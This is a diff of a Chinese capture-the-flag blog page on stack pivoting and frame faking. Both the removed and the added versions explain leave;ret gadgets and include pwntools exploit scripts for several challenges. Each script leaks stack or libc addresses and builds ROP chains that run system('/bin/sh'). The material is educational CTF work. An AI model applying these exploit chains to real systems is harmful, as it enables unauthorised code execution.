@@ -116,91 +116,110 @@ lightGallery(document.getElementById('post-bg'), {
    }
  }
 });
-document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>frame_faking</h1></div><hr><div id="post-content"><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>栈迁移是一种通过劫持程序栈指针（ESP 和 EBP）来绕过缓冲区限制的技术，常用于栈溢出攻击中。当缓冲区空间有限无法直接控制执行流时，栈迁移能够扩展攻击范围，通过迁移栈到可控的内存区域来实现更复杂的攻击。</p>
-<p> 核心概念</p>
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>frame_faking</h1></div><hr><div id="post-content"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>顾名思义，这个利用方法就是构造一个虚假的栈帧来控制程序的执行流。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在之前的栈溢出中不外乎两种形式：</p>
 <ul>
-<li><strong>EBP（栈帧寄存器）</strong>：每次函数调用时，EBP用于维护栈帧结构。通过修改EBP指向攻击者可控的区域，函数栈空间也会发生改变。</li>
-<li><strong>ESP（栈指针寄存器）</strong>：ESP指向栈顶，控制其地址后可以改变程序执行流，通常栈迁移会将其劫持到一个无需长度限制的区域，比如 bss 段。</li>
+<li>控制程序<code>EIP</code></li>
+<li>控制程序<code>EBP</code></li>
 </ul>
-<p> 使用场景<br>栈迁移主要用于缓冲区溢出攻击中的特殊情况：</p>
+<p>最终目的都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制<code>EBP</code>与<code>EIP</code>，这样我们在控制程序执行流的同时，也可以改变程序栈帧的位置。</p>
+<p><strong>frame faking的利用情况：</strong></p>
 <ul>
-<li><strong>缓冲区较小</strong>：当溢出的空间只能覆盖到两个字长的栈内容时，栈迁移可以帮助攻击者突破限制，扩展控制范围。</li>
-<li><strong>受限输入</strong>：当攻击者可输入的数据长度不足以直接覆盖 EIP 时，通过栈迁移可以进一步获得对程序的控制。</li>
+<li>溢出字节较少，难以构造较长的 rop 链。</li>
+<li>存在一块可写的内存，且知道其地址。</li>
 </ul>
-<p> 操作流程</p>
-<ol>
-<li><strong>覆盖 EBP 和 EIP</strong>：通过缓冲区溢出将栈帧寄存器（EBP）覆盖，使得函数调用时栈帧指向攻击者控制的区域。</li>
-<li><strong>调用 <code>leave; ret</code> gadget</strong>：<code>leave</code> 指令会将 EBP 的值赋给 ESP，使得栈指针迁移到新的区域，随后通过 <code>ret</code> 指令恢复执行流。  <ul>
-<li><strong><code>leave</code> 指令</strong>：<code>mov esp, ebp</code> 和 <code>pop ebp</code>，使 ESP 和 EBP 同时被控制。</li>
-<li><strong><code>ret</code> 指令</strong>：跳转到新的返回地址，这通常是由攻击者精心设计的 ROP 链。</li>
+<p>现在我们先来了解一下在 frame faking 中的重要知识点。</p>
+<p><strong>函数的入口点和出口点</strong></p>
+<ul>
+<li>入口点</li>
 </ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">push ebp     <span class="hljs-comment">//将ebp压栈 </span><br>mov ebp, esp <span class="hljs-comment">//将esp的值赋给ebp</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>出口点</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">leave <br>ret   <span class="hljs-comment">//pop eip，弹出栈顶元素作为程序下一个执行地址`</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>其中<code>leave</code>指令相当于</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">mov esp, ebp <span class="hljs-comment">//将ebp的值赋给esp </span><br>pop ebp      <span class="hljs-comment">//弹出ebp</span><br>pop eip      <span class="hljs-comment">//弹出的值为eip</span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>漏洞利用原理：</strong></p>
+<p>我们通过栈溢出将栈结构修改为以下格式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">buffer padding|fake ebp|leave ret addr|<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>函数的返回地址覆盖为执行<code>leave ret</code>指令的地址，这样函数在正常执行完自己的<code>leave ret</code>后，还会再次执行一次<code>leave ret</code>。</li>
+<li>其中<code>fake ebp</code>为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">fake ebp <br>| <br>v <br>ebp2|target function addr|leave ret addr|arg1|arg2<br></code></pre></td></tr></table></figure>
+
+<p>这里我们的<code>fake ebp</code>指向<code>ebp2</code>，即它为<code>ebp2</code>所在的地址。通常来说，这里都是我们能够控制的可读的内容。我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与栈迁移相似。</p>
+<p>我们接下来通过分析<code>leave;ret</code>指令来分析 payload 构造原理。</p>
+<p><code>leave;ret</code>指令相当于<code>mov esp,ebp;pop ebp;pop eip</code>，接下来我们分析一下执行<code>mov esp,ebp;pop eip</code>指令时的栈结构。</p>
+<ul>
+<li><p><code>mov esp,ebp</code> 将<code>ebp</code>的值赋给<code>esp</code>，此时<code>esp</code>和<code>ebp</code>同时指向<code>ebp</code>基址处，也就是我们设置的可控制的<code>fake ebp</code>值处。</p>
 </li>
-<li><strong>执行 ROP 链</strong>：在新栈区域中，攻击者可以通过 ROP（Return-Oriented Programming）链进行任意代码执行。</li>
-</ol>
-<p> 实际应用<br>栈迁移常常通过将 EBP 和 ESP 指向 bss 段等长度不受限制的内存区域，使得攻击者可以操作更多的栈空间。通过 <code>leave; ret</code> gadget，有效利用溢出的少量字节数来改变程序执行逻辑，从而实现进一步的利用。</p>
-<p> 优化策略</p>
-<ul>
-<li><strong>选择合适的栈迁移目标区域</strong>：bss 段是常见的迁移目标，它通常没有长度限制且可读写，适合存储 ROP 链。</li>
-<li>**精确利用 <code>leave; ret</code>**：利用好这两个指令可以确保栈指针成功迁移，并让攻击者在迁移后的控制区域继续执行代码。</li>
-<li><strong>ROP 链灵活设计</strong>：根据不同场景设计和优化 ROP 链，确保在栈迁移后能够顺利控制程序的后续执行。</li>
+<li><p><code>pop ebp</code> 弹出栈顶，也就是<code>ebp</code>的基址，这时会将我们设置的<code>fake ebp</code>赋值给<code>ebp</code>寄存器，同时<code>esp+4</code>栈下调。</p>
+</li>
+<li><p>执行<code>ret</code>指令，<code>ret</code>指令相当于<code>pop eip</code>；此时栈顶设置为我们查找到的的<code>leave;ret</code>指令。执行<code>ret</code>之后<code>eip</code>接下来将执行<code>leave;ret</code>指令。</p>
+</li>
+<li><p>执行<code>leave;ret</code>指令，<code>mov esp,ebp</code>将<code>ebp</code>的值赋给<code>esp</code>，此时<code>ebp</code>寄存器中保存的值为我们设置的虚假的可控的地址，于是<code>esp</code>指向了该可控地址</p>
+</li>
+<li><p><code>pop ebp</code>栈顶弹出赋给<code>ebp</code>，相当于该可控地址的第一个4位地址内容弹出，赋给<code>ebp</code>，可以设置4个<code>a</code>来padding，<code>esp+4</code>上行。</p>
+</li>
+<li><p>执行<code>ret</code>，我们一般将此时<code>esp</code>指向的地址设为目标函数地址，就可执行目标函数了。</p>
+</li>
 </ul>
-<p>栈迁移技术扩展了攻击者的控制范围，是解决栈空间不足问题的有效手段，在实际安全研究和攻击中广泛应用。</p>
-<blockquote>
-<p><code>leave == mov esp,ebp; pop ebp;</code><br><code>ret == pop eip</code></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><blockquote>
+<p>2018 安恒杯 over</p>
 </blockquote>
-<p>通用模板记忆</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">第一次栈迁移进行rbp修改让下次输入指向我们需要的地方<br>第二次栈迁移修改rsp让程序正常<br>第三次正常rop构造<br>第四次等同第一次<br>第五次getshell rop链<br></code></pre></td></tr></table></figure>
+<ul>
+<li>分析</li>
+</ul>
+<p>checksec 发现没有<code>canary</code>保护和<code>PIE</code>保护。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250218225332.png'><img src="/assets/Pasted%20image%2020250218225332.png"></p>
+<p>ida 分析，发现主函数中<code>while</code>循环调用了一个自定义函数。跟进查看。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250218225435.png'><img src="/assets/Pasted%20image%2020250218225435.png"></p>
+<p>分析函数发现存在栈溢出，但是只能溢出 16 字节无法构造较长的 rop 链。</p>
+<p>但是<code>read</code>函数并不会给输入字符串末尾补<code>\0</code>，所以当我们输入<code>0x50</code>个字符时，可以将<code>rbp</code>的值打印出来。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250218225525.png'><img src="/assets/Pasted%20image%2020250218225525.png"></p>
+<p>接下来我们分析栈结构。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250220232646.png'><img src="/assets/Pasted%20image%2020250220232646.png"></p>
+<p>从这里可以看到我们将泄露出的<code>rbp</code>是<code>0x7fffffffd420</code>，而我们输入的内容的地址为<code>0x7fffffffd3b0</code>。</p>
+<p><code>0x7fffffffd420-0x7fffffffd3b0=0x70</code>，两个地址之间的偏移相差<code>0x70</code>。</p>
+<p>所以我们可以输入 payload 后，通过<code>leave;ret</code>指令将<code>rsp</code>迁移到 payload 处。</p>
+<p>接下来我们寻找<code>leave;ret</code>指令。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250218231636.png'><img src="/assets/Pasted%20image%2020250218231636.png"></p>
+<p><code>fake rbp</code>设置为原来的<code>rbp-0x70</code>，然后再次进行一次<code>leave;ret</code>。</p>
+<p>这里我们需要执行两次 payload，因为我们需要先泄露<code>libc</code>地址来查找<code>libc</code>函数。</p>
+<p>因为程序存在循环不断执行，所以我们可以第一次 payload 泄露<code>libc</code>地址，然后第二次 payload getshell。</p>
+<p><strong>栈结构分析</strong></p>
+<p>进行两次<code>leave;ret</code>，第一个我们将<code>rbp</code>迁移到输入处，第二次我们将<code>rsp</code>迁移到输入处。</p>
+<ul>
+<li>没执行前堆栈</li>
+</ul>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250222134312.png'><img src="/assets/Pasted%20image%2020250222134312.png"></p>
+<ul>
+<li>第一次<code>leave;ret</code>，将<code>rbp</code>迁移过去。</li>
+</ul>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250222134350.png'><img src="/assets/Pasted%20image%2020250222134350.png"></p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250222134433.png'><img src="/assets/Pasted%20image%2020250222134433.png"></p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250222134452.png'><img src="/assets/Pasted%20image%2020250222134452.png"></p>
+<ul>
+<li>第二次<code>leave;ret</code>，将<code>rsp</code>指针迁移过去</li>
+</ul>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250222134540.png'><img src="/assets/Pasted%20image%2020250222134540.png"></p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250222134607.png'><img src="/assets/Pasted%20image%2020250222134607.png"></p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020250222134626.png'><img src="/assets/Pasted%20image%2020250222134626.png"></p>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc.address + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc.address + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">c=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> c:<br>        gdb.attach(io, c)<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(io)<br>        pause()<br>  <br>s = <span class="hljs-keyword">lambda</span> data: io.send(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data: io.sendafter(text, data)<br>sl = <span class="hljs-keyword">lambda</span> data: io.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> text, data: io.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>: io.recv(num)<br>ru = <span class="hljs-keyword">lambda</span> text: io.recvuntil(text)<br>pr = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>: <span class="hljs-built_in">print</span>(io.recv(num))<br>ia = <span class="hljs-keyword">lambda</span>: io.interactive()<br>ic = <span class="hljs-keyword">lambda</span>: io.close()<br>l32 = <span class="hljs-keyword">lambda</span>: u32(io.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>l64 = <span class="hljs-keyword">lambda</span>: u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu32 = <span class="hljs-keyword">lambda</span>: u32(io.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span>: u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>int16 = <span class="hljs-keyword">lambda</span> data: <span class="hljs-built_in">int</span>(data, <span class="hljs-number">16</span>)<br>lg = <span class="hljs-keyword">lambda</span> s, num: io.success(<span class="hljs-string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))<br> <br>elf = ELF(<span class="hljs-string">&#x27;over&#x27;</span>)<br>io = process([elf.path])<br><span class="hljs-comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;/buu/64/libc-2.23.so&#x27;</span>)<br>context(os=elf.os, arch=elf.arch, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>dbg()<br>  <br><span class="hljs-comment">#泄露rbp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x50</span><br>ru(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>s(payload)<br>  <br>rbp_addr =  u64(ru(<span class="hljs-string">b&quot;\n&quot;</span>)[-<span class="hljs-number">7</span>:-<span class="hljs-number">1</span>] + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>lg(<span class="hljs-string">&quot;rbp&quot;</span>,rbp_addr)<br><br>pop_rdi = <span class="hljs-number">0x400793</span><br>puts_got = elf.got.puts<br>puts_plt = elf.plt.puts<br>ret=<span class="hljs-number">0x0000000000400509</span><br>vuln = <span class="hljs-number">0x400676</span><br>leave_ret = <span class="hljs-number">0x4006be</span><br><span class="hljs-comment">#pause()</span><br><br> <br><span class="hljs-comment">#前面填充的&quot;a&quot;是因为程序并不会执行它</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)+<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">40</span>+p64(rbp_addr-<span class="hljs-number">0x70</span>)+p64(leave_ret)<br> <br>s(payload)<br>  <br>libc.address = l64()-libc.sym.puts<br>lg(<span class="hljs-string">&quot;libc base&quot;</span>,libc.address)<br>sys = libc.sym.system<br>sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>lg(<span class="hljs-string">&quot;system&quot;</span>,sys)<br>lg(<span class="hljs-string">&quot;sh&quot;</span>,sh)<br>  <br><span class="hljs-comment">#执行system(&quot;/bin/sh&quot;)，添加一个ret平栈</span><br><span class="hljs-comment">#这里减去0x30是因为再次进入漏洞函数时，函数开头的汇编指令改变了栈结构。</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(sh)+ p64(ret) + p64(sys) + p64(vuln) + <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + p64(rbp_addr-<span class="hljs-number">0x70</span>-<span class="hljs-number">0x30</span>) + p64(leave_ret)<br><br>s(payload)<br>  <br>ia()<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">padding+p64(fake_stack)+p64(leave)<br></code></pre></td></tr></table></figure>
-
-<h2 id="栈上迁移"><a href="#栈上迁移" class="headerlink" title="栈上迁移"></a>栈上迁移</h2><p>栈上栈迁移的重点是要泄露栈帧</p>
-<blockquote>
-<p>[HDCTF 2023]KEEP ON</p>
-</blockquote>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script()<br>io=gift[<span class="hljs-string">&quot;io&quot;</span>]<br>elf=gift[<span class="hljs-string">&quot;elf&quot;</span>]<br><br><span class="hljs-built_in">format</span>=<span class="hljs-string">b&quot;%16$p&quot;</span><br>sa(<span class="hljs-string">b&quot;name: \n&quot;</span>,<span class="hljs-built_in">format</span>)<br>ru(<span class="hljs-string">b&quot;hello,&quot;</span>)<br>leak_ebp=<span class="hljs-built_in">int</span>(r(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>success(<span class="hljs-built_in">hex</span>(leak_ebp))<br><br>target=leak_ebp-<span class="hljs-number">0x60</span>-<span class="hljs-number">8</span><br>leave=<span class="hljs-number">0x4007f2</span><br>rdi=<span class="hljs-number">0x00000000004008d3</span><br>sys=elf.plt.system<br>sh=target+<span class="hljs-number">32</span><br>payload=p64(rdi)+p64(sh)+p64(sys)+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>payload=payload.ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(target)+p64(leave)<br><br>sa(<span class="hljs-string">&quot;keep on !\n&quot;</span>,payload)<br><br>ia()<br></code></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>[CISCN 2019东南]PWN2]</p>
-</blockquote>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script()<br>io=gift[<span class="hljs-string">&quot;io&quot;</span>]<br>elf=gift[<span class="hljs-string">&quot;elf&quot;</span>]<br>context.arch=<span class="hljs-string">&quot;i386&quot;</span><br><br>sa(<span class="hljs-string">b&quot;name?\n&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>)<br>ru(<span class="hljs-string">b&quot;aaab&quot;</span>)<br><br><span class="hljs-comment">#泄露的ebp地址</span><br>leak_ebp=u32(ru(<span class="hljs-string">b&quot;\xff&quot;</span>))<br><br>off=<span class="hljs-number">0x38</span><br>leave=<span class="hljs-number">0x8048593</span><br><br><span class="hljs-comment">#payload开始地址</span><br>target=leak_ebp-off-<span class="hljs-number">0x4</span><br>sh=leak_ebp-off+<span class="hljs-number">0xc</span><br><br>payload=p32(elf.plt.system)+p32(elf.sym._start)+p32(sh)+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p32(target)+p32(leave)<br><br>s(payload)<br><br>ia()<br></code></pre></td></tr></table></figure>
-
-<h2 id="迁移到bss段"><a href="#迁移到bss段" class="headerlink" title="迁移到bss段"></a>迁移到bss段</h2><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><blockquote>
-<p>2024 羊城杯 pstack</p>
-</blockquote>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script()<br>io=gift[<span class="hljs-string">&quot;io&quot;</span>]<br>elf=gift[<span class="hljs-string">&quot;elf&quot;</span>]<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context.arch=elf.arch<br><br>rdi=<span class="hljs-number">0x0000000000400773</span><br>ret=<span class="hljs-number">0x0000000000400506</span> <br>leave_ret=<span class="hljs-number">0x4006db</span><br>bss=elf.bss()+<span class="hljs-number">0x500</span><br>vuln=<span class="hljs-number">0x4006c4</span><br>rbp=<span class="hljs-number">0x4005b0</span><br>puts_got=elf.got.puts<br>puts_plt=elf.plt.puts<br><br>pay1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss+<span class="hljs-number">0x30</span>)+p64(vuln)<br>s(pay1)<br><br>pay2=p64(rdi)+p64(puts_got)+p64(puts_plt)<br>pay2+=p64(rbp)+p64(bss+<span class="hljs-number">0x200</span>+<span class="hljs-number">0x30</span>)+p64(vuln)<br>pay2+=p64(bss-<span class="hljs-number">8</span>)+p64(leave_ret)<br><br>s(pay2)<br><br>ru(<span class="hljs-string">b&quot;flow?\n&quot;</span>)<br>puts_addr=u64(ru(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base=puts_addr-libc.sym.puts<br>sys=base+libc.sym.system<br>sh=base+libc.search(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).__next__()<br><br>pay3=(p64(rdi)+p64(sh)+p64(sys)).ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay3+=p64(bss+<span class="hljs-number">0x200</span>-<span class="hljs-number">0x8</span>)+p64(leave_ret)<br>s(pay3)<br><br>ia()<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>[NSSRound#14 Basic]rbp</p>
-</blockquote>
-<blockquote>
-<p>[HNCTF 2022 WEEK2]pivot</p>
-</blockquote>
-<blockquote>
-<p>[HGAME 2023 week1]orw</p>
-</blockquote>
-<blockquote>
-<p>[CISCN 2019华南]PWN4</p>
-</blockquote>
-<blockquote>
-<p>[HDCTF 2023]Minions</p>
-</blockquote>
-<blockquote>
-<p>[HDCTF 2023]Makewish</p>
-</blockquote>
-<blockquote>
-<p>[强网杯 2022]devnull</p>
-</blockquote>
-<blockquote>
-<p>[MTCTF 2021]babyrop]</p>
-</blockquote>
-<blockquote>
-<p>[SCTF 2022]Secure Horoscope</p>
-</blockquote>
 <h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><blockquote>
-<p>参考链接： <a target="_blank" rel="noopener" href="https://ctf-wiki.org/">https://ctf-wiki.org/</a><br>参考链接：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/aooqgb">PWN入门（2-2-1）-栈迁移（x86） (yuque.com)</a></p>
+<p>参考：ctf-wiki<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104580019">花式栈溢出技巧之frame faking_frame fake-CSDN博客</a></p>
 </blockquote>
